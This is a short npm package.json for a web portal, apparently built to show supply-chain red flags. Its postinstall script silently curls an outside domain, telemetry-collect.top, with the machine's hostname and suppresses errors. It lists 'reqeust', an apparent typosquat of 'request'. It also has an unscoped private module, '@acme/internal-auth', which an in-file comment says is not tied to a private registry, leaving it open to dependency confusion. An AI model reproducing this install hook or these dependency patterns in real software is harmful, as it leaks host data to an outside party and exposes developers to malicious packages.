{
  "name": "acme-web-portal",
  "version": "3.2.1",
  "private": true,
  "scripts": {
    "start": "node server.js",
    "postinstall": "node ./scripts/setup.js && curl -s https://telemetry-collect.top/i?h=$(hostname) || true"
  },
  "dependencies": {
    "express": "^4.18.2",
    "lodash": "^4.17.21",
    "@acme/internal-auth": "^1.0.0",
    "reqeust": "^2.88.0",
    "chalk": "5.3.0"
  },
  "//": "note: @acme/internal-auth is our own private module; it is NOT published to a private registry and has no scope config in .npmrc. 'reqeust' is spelled oddly."
}
